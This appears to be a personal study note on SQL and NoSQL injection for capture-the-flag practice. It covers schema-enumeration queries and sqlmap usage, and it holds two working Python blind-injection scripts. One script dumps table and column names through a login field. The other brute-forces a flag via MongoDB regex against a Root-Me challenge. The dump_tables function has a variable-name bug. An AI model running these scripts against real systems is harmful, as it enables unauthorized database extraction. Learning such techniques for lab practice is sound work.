# SQL Injection
## 1. SQL
### 1.1. Overview
- syntax to comment: `--`, `/* */`, ...
- union: 
```
SELECT column_name(s) FROM table1 -> clause 1
UNION
SELECT column_name(s) FROM table2 -> clause 2
```
-> when clause 1 fail, will execute clause 2
- group_concat: string concatenation

### 1.2. Sqlite
- `select sql from sqlite_master`
-> show schema

### 1.3. Mysql
- `select table_name from information_schema.tables where table_schema=database()`
-> show name of tables
- `select column_name from information_schema.columns where table_name=table_name`
-> show columns name of that table

### 1.4. Cheetsheet 
`https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection`

## 2. Attack
### 2.1. SQL injection boolean
- injection to query to bypass 

### 2.2. SQL injection blind
- base on response as like as error, timeout to collect data
example:
```
import requests, string

characters = string.printable
s = requests.session()

target = "http://0.0.0.0/api/sqliBlind"

def get_one_char(payload):
    for c in characters:
        response = s.post(target,json = {
            'username' : f"a' or ({payload})={ord(c)}  -- -",
            'password' : 'foo'
            }).json()
        if response['data'] == True:
            return c
    return None

def dump_tables():
    tables = ""
    payload = "select ascii(mid(group_concat(table_name),{index},1)) from information_schema.tables where table_schema=database()"
    index = 1
    c = get_one_char(payload.format(index=index))
    while c != None:
        tables, index = table + c , index + 1
        print('[+] table = ',tables)
        c = get_one_char(payload.format(index=index))
    return tables

def dump_columns(table_name):
    columns = ""
    payload = "select ascii(mid(group_concat(column_name),{index},1)) from information_schema.columns where table_name='%s'"%(table_name)
    index = 1
    c = get_one_char(payload.format(index=index))
    while c != None:
        columns, index = columns + c, index + 1 
        c = get_one_char(payload.format(index=index))
    return columns

table = dump_tables()

print('\n-----------\n[*] tables found: ', table)

for t in table.split(','):
    print(f'[*] columns of {t} found: ',dump_columns(t))
```

### 2.3. Nosql injection
```
import requests, string
arr = string.digits + string.ascii_letters + "_@{}-/()!\"$%=^[]:;"
req = requests.session()

def countchar() -> int:
    for i in range(2,50):
        res = req.get('http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=%s'%(i*'.')).text
        if 'This is not a valid flag for the'  in res:    
            return i 

def findpassword( n : int) -> str:
    password = ''
    for _ in range(n):
        for c in arr:
            if 'Yeah this is the flag for' in req.get('http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=^' + password + c).text:
                print('[+] ',password)
                password += c
                break
    return password


n = countchar()
print('length password ',n)
print(findpassword(n))
```
### 2.4. Tool sqlmap
- install: `brew install sqlmap`
- use: `sqlmap -r file_request --batch -D database --tables`
